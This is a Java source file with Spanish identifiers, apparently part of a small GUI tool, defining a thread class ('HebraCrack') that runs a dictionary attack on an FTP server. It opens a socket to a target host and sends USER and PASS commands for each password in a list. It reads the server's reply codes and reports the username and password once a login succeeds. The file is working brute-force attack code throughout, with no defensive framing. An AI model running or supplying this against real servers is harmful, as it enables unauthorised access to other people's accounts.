package gui;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;

public class HebraCrack extends Thread{

	private CrackDiccionario cd;
	private String usuario;
	private ArrayList<String> passwords;
	private BufferedReader fEnt;
	private PrintWriter fSal;
	private Socket servidor;
	private int pos;
	private VistaCrackeador vc;
	private static boolean salir = false;

	public HebraCrack(CrackDiccionario cd, String usuario, ArrayList<String> passwords, VistaCrackeador vc) {
		this.cd = cd;
		this.passwords = passwords;
		this.usuario = usuario;
		this.vc = vc;
		pos = 0;
		salir = false;
		try{
			servidor = new Socket(cd.getHost(), cd.getPuerto());
			fEnt = new BufferedReader(new InputStreamReader(servidor.getInputStream()));
			fSal = new PrintWriter(servidor.getOutputStream(), true);
		} catch (IOException ioe){
			ioe.printStackTrace();
		}
	}

	public void run(){
		boolean encontrado = false;
		try{
			for(int i = pos; i < passwords.size() && !encontrado && !salir; i++){
				fSal.println("user "+usuario);
				String linea = fEnt.readLine();
				while(linea.contains("220") || linea.contains("331")){
					if(linea.contains("331"))
						fSal.println("pass "+passwords.get(i));
					linea = fEnt.readLine();
				}
				if(linea.contains("530"))
					vc.setResultado("Contraseña incorrecta");
				if(linea.contains("230")){
					vc.setResultado("User:"+usuario+" - Pass: "+passwords.get(i));
					encontrado = true;
				}
				pos++;
			}
			if(Thread.activeCount() == 6 || vc.isSecuencial()){
				vc.habilitaBotones(true);
				long tiempoTotal = System.currentTimeMillis()-CrackDiccionario.tiempo;
				vc.setTiempo(tiempoTotal);
			}
			fSal.close();
			fEnt.close();
			servidor.close();
		} catch(NullPointerException npe){
			iniciaConexion();
		} catch(SocketException se){
			iniciaConexion();
		} catch (IOException ioe){
			ioe.printStackTrace();
		}
	}

	public void iniciaConexion(){
		try {
			servidor.close();
			servidor = new Socket(cd.getHost(), cd.getPuerto());
			fEnt = new BufferedReader(new InputStreamReader(servidor.getInputStream()));
			fSal = new PrintWriter(servidor.getOutputStream(), true);
			pos--;
			run();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	public void abortar() {
		salir = true;		
	}

}
